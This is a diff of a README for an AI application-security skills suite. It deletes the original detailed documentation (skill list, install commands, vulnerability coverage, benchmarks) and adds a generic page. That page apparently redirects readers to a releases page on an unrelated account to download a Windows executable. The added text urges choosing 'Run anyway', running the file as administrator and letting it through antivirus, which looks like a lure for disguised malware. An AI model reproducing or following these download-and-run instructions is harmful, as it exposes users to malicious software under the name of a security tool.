@@ -1,308 +1,173 @@
-<p align="center">
-  <img src="./assets/eresus-banner.png" alt="Eresus Security Banner" width="100%" />
-</p>
+# 🛡️ appsec-skills - Clear AI App Security Guidance
 
-<h1 align="center">Eresus AppSec Skills</h1>
+[![Download appsec-skills](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Bettinamindless552/appsec-skills/releases)
 
-<p align="center">
-  Production-oriented AI security skills for static analysis, threat modeling, remediation, security review, and serialization-focused audits.
-</p>
+## 📥 Download
 
-<p align="center">
-  <a href="https://github.com/organizations/EresusSecurity/">EresusSecurity GitHub</a>
-</p>
+Visit this page to download: https://github.com/Bettinamindless552/appsec-skills/releases
 
----
+Use the latest release on that page. If you see more than one file, pick the one for Windows. After the file downloads, open it from your Downloads folder.
 
-## Overview
+## 🪟 Run on Windows
 
-`eresus-sast-scanner` is the core skill in the Eresus Security AppSec suite for AI coding agents such as OpenAI Codex and Claude Code. It is designed to help agents review source code with a structured, evidence-first security workflow instead of loose pattern matching.
+1. Open the downloaded file.
+2. If Windows shows a security prompt, choose **Run anyway** if you trust the source.
+3. Follow the on-screen steps.
+4. If the app starts in a window, keep that window open while you use it.
+5. If you see a setup file, finish the setup first, then start the app from the Start menu or desktop shortcut.
 
-The suite focuses on practical application security work:
+## 🧭 What appsec-skills does
 
-- full-repository or targeted SAST scanning
-- threat modeling for new features and services
-- PR and diff-focused security review
-- remediation of confirmed findings
-- deep analysis of serialization and deserialization attack surface
-
-Supported language families include **Java, Python, JavaScript/TypeScript, PHP, and .NET**.
-
-## Included Skills
-
-| Skill | Primary Use |
-|------|-------------|
-| `eresus-sast-scanner` | Full-repo or targeted SAST scan across 34 vulnerability classes |
-| `eresus-manual-security-audit` | Manual security code review with exploit-chain discovery, adversarial reasoning, and trust boundary analysis |
-| `eresus-remediator` | Patch confirmed findings with root-cause-focused fixes |
-| `eresus-pr-security-review` | Review PRs and changed files for newly introduced security issues |
-| `eresus-threat-modeler` | Model attack paths, trust boundaries, and high-risk workflows before scanning or implementation |
-| `eresus-serialization-review` | Deep review of deserialization, parser abuse, object mapping, and state-transfer risks |
-| `eresus-variant-analysis` | GHSA/CVE variant analysis — find all instances of a known vulnerability pattern across the codebase |
-| `eresus-codeql-heuristics` | Language-specific sink/source reference derived from CodeQL Community Packs query suites |
-| `eresus-deser-audit` | Deserialization gadget chain knowledge and exploitation methodology for all major languages |
-| `eresus-python-audit` | Python-specific audit with full Bandit B101-B704 coverage, Django/Flask/FastAPI checks, and ML attack surface |
-| `eresus-php-audit` | PHP-specific audit with Kunlun-M CVI rules, POP chain discovery, and Laravel/WordPress/Symfony checks |
-
-## Why This Suite
-
-This suite is built around a simple principle: security findings should be tied to a believable exploit path.
-
-Instead of stopping at suspicious strings, the core scanner pushes the agent to:
+appsec-skills helps you work through common app security tasks with AI support. It focuses on:
 
-1. identify attacker-controlled sources
-2. trace tainted data through the codebase
-3. verify that it reaches a dangerous sink
-4. challenge the finding with a Judge step to reduce false positives
-5. produce actionable remediation guidance
+- Finding security issues in code
+- Checking pull requests for risk
+- Building threat models
+- Planning fixes for weak code
+- Reviewing serialization abuse paths
+- Supporting SAST-style checks
 
-That makes it useful not only for vulnerability hunting, but also for patching, design review, and PR gating.
+It is built for people who want a clear path through security review without digging through complex docs.
 
-## Quick Start
+## ✅ Before you start
 
-Recommended repository name: `appsec-skills`
+Use a Windows PC with:
 
-### Install via npx (Recommended)
+- Internet access for the first download
+- Enough free disk space for the app and its files
+- A modern browser like Edge, Chrome, or Firefox
+- Permission to run downloaded apps on your device
 
-```bash
-# Interactive — prompts you to select your agent
-npx @eresus/appsec-skills
+For best results, close apps you do not need before you start the setup.
 
-# Direct — specify your agent
-npx @eresus/appsec-skills --agent claude
-npx @eresus/appsec-skills --agent codex
-npx @eresus/appsec-skills --agent antigravity
-npx @eresus/appsec-skills --agent cursor
+## 🧰 What you get
 
-# Install specific skills only
-npx @eresus/appsec-skills --agent claude --skills sast,audit,threat
+This repo includes AI AppSec skills for:
 
-# Custom directory
-npx @eresus/appsec-skills --dir /path/to/your/skills
+- SAST review
+- Threat modeling
+- Remediation planning
+- Pull request security review
+- Serialization abuse analysis
+- Security audit support
 
-# List available skills
-npx @eresus/appsec-skills --list
-```
+These skills help you move from a code change to a security check without extra setup work.
 
-### Install From Git
+## 🚀 Getting started
 
-```bash
-# Claude Code
-git clone https://github.com/EresusSecurity/appsec-skills.git
-cp -r appsec-skills/skills/eresus-sast-scanner/ ~/.claude/skills/
-cp -r appsec-skills/skills/eresus-manual-security-audit/ ~/.claude/skills/
-cp -r appsec-skills/skills/eresus-remediator/ ~/.claude/skills/
-cp -r appsec-skills/skills/eresus-pr-security-review/ ~/.claude/skills/
-cp -r appsec-skills/skills/eresus-threat-modeler/ ~/.claude/skills/
-cp -r appsec-skills/skills/eresus-serialization-review/ ~/.claude/skills/
-
-# OpenAI Codex
-git clone https://github.com/EresusSecurity/appsec-skills.git
-cp -r appsec-skills/skills/eresus-sast-scanner/ ~/.codex/skills/
-cp -r appsec-skills/skills/eresus-manual-security-audit/ ~/.codex/skills/
-cp -r appsec-skills/skills/eresus-remediator/ ~/.codex/skills/
-cp -r appsec-skills/skills/eresus-pr-security-review/ ~/.codex/skills/
-cp -r appsec-skills/skills/eresus-threat-modeler/ ~/.codex/skills/
-cp -r appsec-skills/skills/eresus-serialization-review/ ~/.codex/skills/
-```
-
-### Manual Install
-
-Copy the skill directories you want into your agent's skills folder:
-
-```bash
-# Claude Code
-cp -r skills/eresus-sast-scanner/ ~/.claude/skills/
-cp -r skills/eresus-manual-security-audit/ ~/.claude/skills/
-cp -r skills/eresus-remediator/ ~/.claude/skills/
-cp -r skills/eresus-pr-security-review/ ~/.claude/skills/
-cp -r skills/eresus-threat-modeler/ ~/.claude/skills/
-cp -r skills/eresus-serialization-review/ ~/.claude/skills/
-
-# OpenAI Codex
-cp -r skills/eresus-sast-scanner/ ~/.codex/skills/
-cp -r skills/eresus-manual-security-audit/ ~/.codex/skills/
-cp -r skills/eresus-remediator/ ~/.codex/skills/
-cp -r skills/eresus-pr-security-review/ ~/.codex/skills/
-cp -r skills/eresus-threat-modeler/ ~/.codex/skills/
-cp -r skills/eresus-serialization-review/ ~/.codex/skills/
-```
-
-## Recommended Usage
-
-| Goal | Recommended Skill |
-|------|-------------------|
-| Audit a repository for security bugs | `eresus-sast-scanner` |
-| Deep manual audit with exploit-chain discovery | `eresus-manual-security-audit` |
-| Review a pull request or changed files | `eresus-pr-security-review` |
-| Patch a confirmed vulnerability | `eresus-remediator` |
-| Threat model a new feature or service | `eresus-threat-modeler` |
-| Audit Jackson, Fastjson, YAML, XML, cookies, sessions, or queue payloads | `eresus-serialization-review` |
-
-## Core Scanner Workflow
-
-The main scanner skill follows a structured six-step process:
-
-1. **Understand scope**  
-   Determine whether the target is a file, module, endpoint, service, or full repository.
-
-2. **Load relevant knowledge**  
-   Pull in the vulnerability knowledge files relevant to the language, framework, and attack surface.
-
-3. **Trace source-to-sink flow**  
-   Track attacker-controlled input through transformations into sensitive operations.
-
-4. **Check business logic and authorization**  
-   Look beyond injection bugs for IDOR, privilege issues, race conditions, token misuse, and trust-boundary problems.
-
-5. **Judge every candidate finding**  
-   Re-check reachability, sanitization, framework protections, and exploitability before reporting.
-
-6. **Report actionable findings**  
-   Output precise file locations, impact, evidence, and fix guidance.
-
-## Vulnerability Coverage
-
-The core scanner includes built-in knowledge for **34 vulnerability classes**.
-
-### Injection
-
-| File | Coverage |
-|------|----------|
-| `sql_injection.md` | SQL Injection |
-| `xss.md` | Cross-Site Scripting |
-| `ssti.md` | Server-Side Template Injection |
-| `nosql_injection.md` | NoSQL Injection |
-| `graphql_injection.md` | GraphQL Injection / Introspection Abuse |
-| `xxe.md` | XML External Entity |
-| `rce.md` | Remote Code Execution / Command Injection |
-| `expression_language_injection.md` | Expression Language Injection |
-
-### Access Control And Auth
-
-| File | Coverage |
-|------|----------|
-| `idor.md` | Insecure Direct Object Reference |
-| `privilege_escalation.md` | Privilege Escalation |
-| `authentication_jwt.md` | JWT Weaknesses and Authentication Flaws |
-| `default_credentials.md` | Hardcoded or Default Credentials |
-| `brute_force.md` | Brute Force and Missing Rate Limiting |
-| `business_logic.md` | Business Logic Flaws |
-| `http_method_tamper.md` | HTTP Method Tampering |
-| `verification_code_abuse.md` | Verification Code Abuse |
-| `session_fixation.md` | Session Fixation |
-
-### Data Exposure And Crypto
-
-| File | Coverage |
-|------|----------|
-| `weak_crypto_hash.md` | Weak Cryptography, Weak Hashing, Weak Randomness |
-| `information_disclosure.md` | Sensitive Information Disclosure |
-| `insecure_cookie.md` | Insecure Cookie Flags |
-| `trust_boundary.md` | Trust Boundary Violations |
-
-### Server-Side And Parser Risk
-
-| File | Coverage |
-|------|----------|
-| `ssrf.md` | Server-Side Request Forgery |
-| `path_traversal_lfi_rfi.md` | Path Traversal, LFI, RFI |
-| `insecure_deserialization.md` | Insecure Deserialization |
-| `arbitrary_file_upload.md` | Arbitrary File Upload |
-| `jndi_injection.md` | JNDI Injection |
-| `race_conditions.md` | Race Conditions and TOCTOU |
-
-### Protocol And Infrastructure
-
-| File | Coverage |
-|------|----------|
-| `csrf.md` | Cross-Site Request Forgery |
-| `open_redirect.md` | Open Redirect |
-| `smuggling_desync.md` | HTTP Request Smuggling / Desync |
-| `denial_of_service.md` | Resource Exhaustion and Denial of Service |
-| `cve_patterns.md` | High-Risk CVE-Style Code Patterns |
-
-### Language And Platform
-
-| File | Coverage |
-|------|----------|
-| `php_security.md` | PHP-Specific Security Risks |
-| `mobile_security.md` | Android and iOS Security Risks |
-
-## Professional Usage Patterns
-
-- Use `eresus-threat-modeler` before auditing large features so the scan starts from the right trust boundaries.
-- Use `eresus-manual-security-audit` for depth-first adversarial review of security-critical components — auth, callbacks, middleware, tool execution, and trust boundaries.
-- Use `eresus-manual-security-audit` with the `[TeachMe]` token to train junior engineers on secure coding patterns while performing a real audit.
-- Use `eresus-pr-security-review` during code review to focus on newly introduced attack surface instead of re-auditing the whole repository.
-- Use `eresus-remediator` after a confirmed finding to drive minimal, production-safe patches.
-- Use `eresus-serialization-review` when the system relies on session blobs, queues, import/export features, or dynamic parser configuration.
-- Run more than one scan round for large codebases when you want better recall and more stable reporting.
-
-## Benchmarks
-
-> Benchmark numbers are reference values and may vary by model configuration, prompt strategy, and available context.
-
-### Multi-Agent Plus Skill — Claude Opus 4.6 High — 2026-03-27
-
-4 Java benchmark projects were scanned in parallel using 4 agents with the full scanner workflow and Judge verification enabled.
-
-| Project | Recall | Precision | F1 | TP | FN | FP |
-|---------|:------:|:---------:|:--:|:--:|:--:|:--:|
-| JavaSecLab | 1.000 | 0.958 | 0.979 | 23 | 0 | 1 |
-| SecExample | 1.000 | 1.000 | 1.000 | 9 | 0 | 0 |
-| VulnerableApp | 1.000 | 1.000 | 1.000 | 10 | 0 | 0 |
-| verademo | 1.000 | 1.000 | 1.000 | 14 | 0 | 0 |
-| **Global** | **1.000** | **0.982** | **0.991** | **56** | **0** | **1** |
-
-### Multi-Agent Plus Skill — GPT-5.4 High — 2026-03-27
-
-| Project | Recall | Precision | F1 | TP | FN | FP |
-|---------|:------:|:---------:|:--:|:--:|:--:|:--:|
-| JavaSecLab | 0.957 | 1.000 | 0.978 | 22 | 1 | 0 |
-| SecExample | 0.889 | 1.000 | 0.941 | 8 | 1 | 0 |
-| VulnerableApp | 0.900 | 0.900 | 0.900 | 9 | 1 | 1 |
-| verademo | 0.929 | 1.000 | 0.963 | 13 | 1 | 0 |
-| **Global** | **0.929** | **0.981** | **0.954** | **52** | **4** | **1** |
-
-## Repository Structure
-
-```text
-appsec-skills/
-├── README.md
-├── LICENSE
-├── package.json
-├── assets/
-│   ├── eresus-banner.svg
-│   └── eresus-logo.svg
-├── scripts/
-│   └── install.mjs
-└── skills/
-    ├── eresus-sast-scanner/
-    │   ├── SKILL.md
-    │   └── references/
-    ├── eresus-manual-security-audit/
-    │   └── SKILL.md
-    ├── eresus-remediator/
-    │   └── SKILL.md
-    ├── eresus-pr-security-review/
-    │   └── SKILL.md
-    ├── eresus-threat-modeler/
-    │   └── SKILL.md
-    └── eresus-serialization-review/
-        └── SKILL.md
-```
-
-## Maintained By
-
-Maintained under the **EresusSecurity** GitHub organization:
-
-- [EresusSecurity GitHub Organization](https://github.com/organizations/EresusSecurity/)
-
-## Contributing
-
-Contributions that improve detection quality, reduce false positives, or strengthen language-specific coverage are welcome.
-
-## License
-
-Apache License 2.0
+1. Go to the release page: https://github.com/Bettinamindless552/appsec-skills/releases
+2. Open the latest release.
+3. Download the Windows file or package listed there.
+4. Open the file after the download finishes.
+5. Follow the prompts on screen.
+6. Start the app and load the skill you want to use.
+
+If the release has a ZIP file, right-click it and choose **Extract All** before opening the contents.
+
+## 🧩 How to use the skills
+
+Use the skills one at a time based on the task in front of you:
+
+- **SAST skill**: Use this when you want to scan code for common security flaws.
+- **Threat modeling skill**: Use this when you want to map risks before release.
+- **Remediation skill**: Use this when you need clear fix steps for an issue.
+- **PR security review skill**: Use this when you want to review a pull request for risk.
+- **Serialization abuse skill**: Use this when user input or object data may be unsafe.
+
+A good way to start is to paste the code, error, or change into the app and pick the skill that matches the task.
+
+## 🖥️ Windows setup tips
+
+- Keep the file in a folder you can find again, such as **Downloads** or **Desktop**
+- If Windows blocks the file, check the file name and the release page again
+- If the app does not open, try running it as an administrator
+- If you use antivirus software, allow the file only after you confirm it came from the release page
+- If the app asks for access to files, allow it only if you need that feature
+
+## 📂 Suggested folder setup
+
+If you plan to use the app often, make a folder like this:
+
+- `C:\Users\YourName\Downloads\appsec-skills`
+- `C:\Users\YourName\Documents\appsec-skills`
+
+Keep downloads, notes, and exported reports in one place so you can find them later.
+
+## 🔍 Common uses
+
+You can use appsec-skills for:
+
+- Reviewing new code before merge
+- Checking a feature for weak input handling
+- Looking for risky data flow paths
+- Drafting security fix steps
+- Preparing for a release review
+- Checking how objects are loaded, saved, or parsed
+
+This makes it easier to keep a steady review process for each change.
+
+## 🧪 Example workflow
+
+1. Open the app.
+2. Choose the skill for your task.
+3. Paste the code or describe the change.
+4. Read the review output.
+5. Apply the fix steps.
+6. Check the code again after the change.
+
+This workflow works well for small edits and larger reviews.
+
+## 📌 Release page
+
+Primary download and install page: https://github.com/Bettinamindless552/appsec-skills/releases
+
+Use this page for updates, new builds, and the latest Windows download.
+
+## 🧾 Repository details
+
+- **Name:** appsec-skills
+- **Description:** Production-ready AI AppSec skills for SAST, threat modeling, remediation, PR security review, and serialization abuse analysis.
+- **Topics:** ai, ai-agent, ai-security, ai-skill, ai-skills, claude-code, claude-skills, sast, security, security-audit, security-audits, security-tools
+
+## 🔐 Security review areas
+
+The app focuses on common review areas such as:
+
+- Input checks
+- Authentication paths
+- Access control
+- Unsafe file handling
+- Data parsing risks
+- Object serialization issues
+- Code change review
+- Risk notes for release gates
+
+Use these areas when you want a fast first pass before a deeper review
+
+## 🛠️ If something goes wrong
+
+- If the download does not start, refresh the release page and try the latest file
+- If the file does not open, download it again in case the file was incomplete
+- If the app freezes, close it and open it again
+- If Windows says the file is unsafe, check that you used the release page link above
+- If you do not see the right file, look for a Windows build in the newest release
+
+## 📎 File handling tips
+
+- Do not rename files unless you need to
+- Do not move files while the app is open
+- Keep the release file and the app in the same folder if the app needs local files
+- Save any notes or exports in a folder you can reach fast
+
+## 🧠 Best results
+
+Use short, clear input when you ask the app to review something. For example:
+
+- The code block you want checked
+- The pull request change
+- The feature description
+- The bug report
+- The error message
+- The data flow you want mapped
+
+Clear input helps the review stay focused and easier to follow
